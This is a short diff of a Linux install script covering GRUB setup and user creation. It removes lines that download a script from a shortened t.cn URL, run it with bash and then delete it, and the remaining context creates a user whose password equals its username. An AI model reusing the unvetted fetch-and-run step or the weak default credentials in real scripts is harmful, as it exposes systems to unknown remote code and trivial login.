@@ -258,9 +258,6 @@ apt-get -y install grub-pc
 grub-mkconfig -o /boot/grub/grub.cfg
 grub-install ${target_disk} --force
 mykern=\`ls /boot/vmlinuz-* | grep -oP \"[0-9].*\" | sort -rV | head -1\`
-wget http://t.cn/RZsyTc4
-bash RZsyTc4 \$mykern
-rm RZsyTc4
 useradd -m user -s /bin/bash
 echo user | echo user:user | chpasswd
 adduser user adm
